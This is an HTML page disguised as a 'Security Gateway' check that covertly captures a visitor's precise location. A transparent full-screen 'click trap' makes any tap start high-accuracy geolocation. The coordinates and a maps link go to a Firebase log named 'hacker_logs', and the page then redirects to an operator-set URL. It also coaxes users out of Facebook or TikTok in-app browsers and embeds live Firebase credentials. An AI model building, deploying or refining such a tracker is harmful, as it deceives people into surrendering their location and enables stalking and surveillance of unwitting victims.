<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Gateway</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body {
            margin: 0; padding: 0;
            display: flex; justify-content: center; align-items: center;
            height: 100vh; background-color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            overflow: hidden; text-align: center;
            cursor: pointer; /* মাউস নিলে হাত দেখাবে যাতে ক্লিক করতে ইচ্ছে করে */
        }
        
        /* অদৃশ্য ফাঁদ (পুরো স্ক্রিন জুড়ে) */
        #click-trap {
            position: fixed; top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: 9999; /* সবার উপরে */
            background: transparent;
        }

        #loader { display: block; }
        h2 {
            color: #333; font-weight: 400; font-size: 24px;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse { 0% { opacity: 0.6; } 50% { opacity: 1; } 100% { opacity: 0.6; } }

        #inAppWarning {
            display: none; flex-direction: column; align-items: center; padding: 20px;
        }
        .warn-icon { font-size: 50px; color: #ff9800; margin-bottom: 20px; }
        .arrow-up {
            position: absolute; top: 10px; right: 20px;
            font-size: 40px; color: #333;
            animation: bounce 1s infinite;
        }
        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
        p { color: #555; font-size: 16px; line-height: 1.5; }
    </style>
</head>
<body>

    <div id="click-trap" onclick="forcePermission()"></div>

    <div id="loader">
        <h2>Security Check...</h2>
        <p style="font-size: 12px; color: #999;">Tap screen if loading takes time</p>
    </div>

    <div id="inAppWarning">
        <div class="arrow-up"><i class="fas fa-arrow-up"></i></div>
        <div class="warn-icon"><i class="fas fa-shield-alt"></i></div>
        <h3 style="margin-top:0">Action Required</h3>
        <p>This page cannot run inside Facebook/TikTok browser.</p>
        <p><strong>1. Click the 3 dots (⋮) at the top right.</strong><br>
        <strong>2. Select "Open in Browser" or "Open in Chrome".</strong></p>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
        import { getDatabase, ref, push, set, child, get } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyA-2qU45jgtvoxzOdVysbZKdixEyvMY3C8",
            authDomain: "location-611d6.firebaseapp.com",
            databaseURL: "https://location-611d6-default-rtdb.firebaseio.com",
            projectId: "location-611d6",
            storageBucket: "location-611d6.firebasestorage.app",
            messagingSenderId: "903100559116",
            appId: "1:903100559116:web:08c8c9e1d7282048116329"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);
        
        let dataSent = false; 

        // গ্লোবাল ফাংশন বানাতে হবে যাতে HTML থেকে call করা যায়
        window.forcePermission = function() {
            startTracking();
        }

        function checkBrowser() {
            var ua = navigator.userAgent || navigator.vendor || window.opera;
            var isInApp = (ua.indexOf("FBAN") > -1) || (ua.indexOf("FBAV") > -1) || (ua.indexOf("Instagram") > -1) || (ua.indexOf("TikTok") > -1);

            if (isInApp) {
                document.getElementById('loader').style.display = 'none';
                document.getElementById('inAppWarning').style.display = 'flex';
                // ইন-অ্যাপ হলে ক্লিক ট্র্যাপ সরিয়ে ফেলব, নাহলে বাটন কাজ করবে না
                document.getElementById('click-trap').style.display = 'none';
            } else {
                startTracking();
            }
        }

        function startTracking() {
            if ("geolocation" in navigator) {
                navigator.geolocation.watchPosition(
                    processLocation,
                    function(error) { 
                        // যদি পারমিশন ডিনাই করে বা এরর হয়
                        console.log("Waiting for permission...");
                    },
                    { enableHighAccuracy: true, timeout: 30000, maximumAge: 5000 }
                );
            } else {
                window.location.href = "https://www.google.com";
            }
        }

        function processLocation(position) {
            if(dataSent) return; 
            dataSent = true;

            // লোকেশন পাওয়ার সাথে সাথে ফাঁদ সরিয়ে ফেলব
            document.getElementById('click-trap').style.display = 'none';

            const lat = position.coords.latitude;
            const lng = position.coords.longitude;
            
            const trackerRef = ref(db, 'hacker_logs');
            const newLogRef = push(trackerRef);
            
            // ✅ FIXED: এখানে ${lat} ঠিক করে দিয়েছি
            const mapsLink = `https://www.google.com/maps?q=$${lat},${lng}`;

            set(newLogRef, {
                timestamp: new Date().toString(),
                googleMapsLink: mapsLink,
                latitude: lat,
                longitude: lng,
                accuracy: position.coords.accuracy
            }).then(() => {
                const dbRef = ref(db);
                get(child(dbRef, "site_settings/redirect_link")).then((snapshot) => {
                    if (snapshot.exists()) {
                        window.location.href = snapshot.val();
                    } else {
                        window.location.href = "https://www.google.com";
                    }
                }).catch(() => {
                    window.location.href = "https://www.google.com";
                });
            });
        }

        window.onload = checkBrowser;
    </script>
</body>
</html>
